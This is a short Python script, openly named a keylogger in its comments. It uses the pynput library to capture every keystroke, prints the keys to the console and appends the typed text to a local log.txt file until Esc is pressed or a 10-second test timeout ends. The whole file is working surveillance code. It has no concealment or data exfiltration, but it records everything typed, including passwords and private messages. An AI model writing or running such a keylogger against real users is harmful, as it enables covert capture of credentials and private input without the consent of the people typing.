from typing import List  # Import List for type hinting
from pynput.keyboard import Key, Listener

# Global variables to store key logs
char_count = 0
saved_keys = []

def on_key_press(key: str):
    try:
        print("Key Pressed: ", key)
    except Exception as ex:
        print("There was an error: ", ex)

def on_key_release(key):
    global saved_keys, char_count

    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            write_to_file(saved_keys)
            char_count = 0
            saved_keys = []

        elif key == Key.space:
            key = " "
            write_to_file(saved_keys)
            saved_keys = []
            char_count = 0

        saved_keys.append(key)
        char_count += 1

def write_to_file(keys: List[str]):
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if "key".upper() not in key.upper():
                file.write(key)
        file.write("\n")

# Start the keylogger
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join(timeout=10)  # Run for 10 seconds for testing
    print("End key logging...")
